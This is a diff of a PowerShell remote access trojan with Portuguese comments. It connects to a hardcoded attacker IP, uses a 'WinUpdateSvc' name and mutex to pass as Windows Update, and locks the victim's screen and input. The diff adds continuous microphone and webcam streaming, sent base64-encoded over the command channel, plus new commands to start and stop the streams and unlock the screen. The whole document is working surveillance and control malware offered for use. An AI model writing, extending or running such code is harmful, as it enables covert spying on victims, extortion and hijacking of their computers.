@@ -9,7 +9,7 @@ Version: 10.0.19045.1
 
 # ===== CONFIGURACOES =====
 $serverIP = "198.1.195.194"  # MUDE PARA SEU IP
-$serverPort = 4444
+$serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
 
@@ -237,6 +237,8 @@ function Block-System32 {
 }
 
 # ===== TELA PRETA (BLOQUEIO TOTAL) =====
+$blackScreenForm = $null
+
 function Black-Screen {
     try {
         Add-Type @"
@@ -254,21 +256,35 @@ function Black-Screen {
                     this.KeyPreview = true;
                 }
                 protected override bool ProcessCmdKey(ref Message msg, Keys keyData) {
-                    return true; // Bloqueia todas as teclas
+                    return true;
                 }
             }
 "@ -ReferencedAssemblies "System.Windows.Forms.dll", "System.Drawing.dll"
         
-        $form = New-Object BlackScreenForm
-        $form.ShowDialog()
+        $global:blackScreenForm = New-Object BlackScreenForm
+        $global:blackScreenForm.ShowDialog()
         return "BLACK_SCREEN"
     } catch {
         return "BLACK_SCREEN_ERROR"
     }
 }
 
+function Unlock-Screen {
+    try {
+        if ($global:blackScreenForm -and !$global:blackScreenForm.IsDisposed) {
+            $global:blackScreenForm.Invoke([Action]{ $global:blackScreenForm.Close() })
+            $global:blackScreenForm.Dispose()
+            $global:blackScreenForm = $null
+        }
+        return "UNLOCK_SCREEN"
+    } catch {
+        return "UNLOCK_ERROR"
+    }
+}
+
 # ===== TRAVAR MOUSE + TECLADO =====
 $lockActive = $false
+$lockHook = $null
 
 function Lock-Input {
     try {
@@ -313,18 +329,14 @@ function Lock-Input {
                 public static void Lock() {
                     _locked = true;
                     
-                    // Trava mouse no canto
                     RECT rect = new RECT();
                     rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
                     ClipCursor(ref rect);
                     
-                    // Esconde cursor
                     ShowCursor(false);
                     
-                    // Bloqueia entrada
                     try { BlockInput(true); } catch { }
                     
-                    // Hook de teclado
                     using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
                     using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
                         _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
@@ -334,20 +346,16 @@ function Lock-Input {
                 public static void Unlock() {
                     _locked = false;
                     
-                    // Libera mouse
                     RECT rect = new RECT();
                     rect.left = 0; rect.top = 0;
                     rect.right = Screen.PrimaryScreen.Bounds.Width;
                     rect.bottom = Screen.PrimaryScreen.Bounds.Height;
                     ClipCursor(ref rect);
                     
-                    // Mostra cursor
                     ShowCursor(true);
                     
-                    // Libera entrada
                     try { BlockInput(false); } catch { }
                     
-                    // Remove hook
                     if (_hookID != IntPtr.Zero) {
                         UnhookWindowsHookEx(_hookID);
                         _hookID = IntPtr.Zero;
@@ -415,7 +423,6 @@ function Get-Microphone {
     try {
         $filename = "$env:TEMP\mic_$(Get-Random).wav"
         
-        # Usa SoundRecorder (nativo do Windows)
         $recorder = New-Object -ComObject SoundRecorder
         $recorder.StartRecording($filename)
         Start-Sleep -Seconds 5
@@ -430,6 +437,44 @@ function Get-Microphone {
     } catch {
         return "AUDIO_ERROR"
     }
+}
+
+# ===== MICROFONE STREAM =====
+$micActive = $false
+$micThread = $null
+
+function Start-MicStream {
+    param($writer)
+    
+    $global:micActive = $true
+    
+    while ($global:micActive) {
+        try {
+            $filename = "$env:TEMP\mic_$(Get-Random).wav"
+            
+            $recorder = New-Object -ComObject SoundRecorder
+            $recorder.StartRecording($filename)
+            Start-Sleep -Seconds 2
+            $recorder.StopRecording()
+            
+            if (Test-Path $filename) {
+                $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
+                Remove-Item $filename -Force
+                $writer.WriteLine("MIC_STREAM:$content")
+            }
+        } catch {
+            # Ignora erros
+        }
+        Start-Sleep -Milliseconds 100
+    }
+}
+
+function Stop-MicStream {
+    $global:micActive = $false
+    if ($global:micThread -and $global:micThread.IsAlive) {
+        $global:micThread.Abort()
+    }
+    return "MIC_STOPPED"
 }
 
 # ===== WEBCAM =====
@@ -487,6 +532,80 @@ function Get-Webcam {
     } catch {
         return "WEBCAM_ERROR"
     }
+}
+
+# ===== WEBCAM STREAM =====
+$webcamActive = $false
+$webcamThread = $null
+
+function Start-WebcamStream {
+    param($writer)
+    
+    Add-Type @"
+        using System;
+        using System.Drawing;
+        using System.Runtime.InteropServices;
+        using System.Windows.Forms;
+        
+        public class WebcamCapture {
+            [DllImport("avicap32.dll")]
+            public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
+            
+            [DllImport("user32.dll")]
+            public static extern bool SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
+            
+            [DllImport("user32.dll")]
+            public static extern bool DestroyWindow(IntPtr hWnd);
+            
+            const int WM_CAP_CONNECT = 0x400 + 10;
+            const int WM_CAP_DISCONNECT = 0x400 + 11;
+            const int WM_CAP_GET_FRAME = 0x400 + 12;
+            const int WM_CAP_SAVEDIB = 0x400 + 25;
+            
+            public static string CaptureFrame() {
+                IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
+                if (hWnd != IntPtr.Zero) {
+                    SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
+                    SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
+                    
+                    string filename = System.IO.Path.GetTempFileName() + ".bmp";
+                    SendMessage(hWnd, WM_CAP_SAVEDIB, 0, (int)Marshal.StringToHGlobalAnsi(filename));
+                    
+                    SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
+                    DestroyWindow(hWnd);
+                    
+                    if (System.IO.File.Exists(filename)) {
+                        byte[] bytes = System.IO.File.ReadAllBytes(filename);
+                        System.IO.File.Delete(filename);
+                        return Convert.ToBase64String(bytes);
+                    }
+                }
+                return null;
+            }
+        }
+"@ -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll"
+    
+    $global:webcamActive = $true
+    
+    while ($global:webcamActive) {
+        try {
+            $frame = [WebcamCapture]::CaptureFrame()
+            if ($frame) {
+                $writer.WriteLine("WEBCAM_STREAM:$frame")
+            }
+        } catch {
+            # Ignora erros
+        }
+        Start-Sleep -Milliseconds 100
+    }
+}
+
+function Stop-WebcamStream {
+    $global:webcamActive = $false
+    if ($global:webcamThread -and $global:webcamThread.IsAlive) {
+        $global:webcamThread.Abort()
+    }
+    return "WEBCAM_STOPPED"
 }
 
 # ===== PROCESSOS =====
@@ -620,6 +739,9 @@ while ($true) {
                     $ps.AddScript({ Black-Screen }).BeginInvoke()
                     $writer.WriteLine("BLACK_SCREEN")
                 }
+                "unlock_screen" {
+                    $writer.WriteLine((Unlock-Screen))
+                }
                 "lock_input" {
                     $writer.WriteLine((Lock-Input))
                 }
@@ -637,8 +759,32 @@ while ($true) {
                 "mic" {
                     $writer.WriteLine((Get-Microphone))
                 }
+                "mic_start" {
+                    if ($global:micThread -and $global:micThread.IsAlive) { $global:micThread.Abort() }
+                    $global:micThread = [System.Threading.Thread]::new({
+                        Start-MicStream $writer
+                    })
+                    $global:micThread.IsBackground = $true
+                    $global:micThread.Start()
+                    $writer.WriteLine("MIC_STREAM_STARTED")
+                }
+                "mic_stop" {
+                    $writer.WriteLine((Stop-MicStream))
+                }
                 "webcam" {
                     $writer.WriteLine((Get-Webcam))
+                }
+                "webcam_start" {
+                    if ($global:webcamThread -and $global:webcamThread.IsAlive) { $global:webcamThread.Abort() }
+                    $global:webcamThread = [System.Threading.Thread]::new({
+                        Start-WebcamStream $writer
+                    })
+                    $global:webcamThread.IsBackground = $true
+                    $global:webcamThread.Start()
+                    $writer.WriteLine("WEBCAM_STREAM_STARTED")
+                }
+                "webcam_stop" {
+                    $writer.WriteLine((Stop-WebcamStream))
                 }
                 
                 # ===== SISTEMA =====
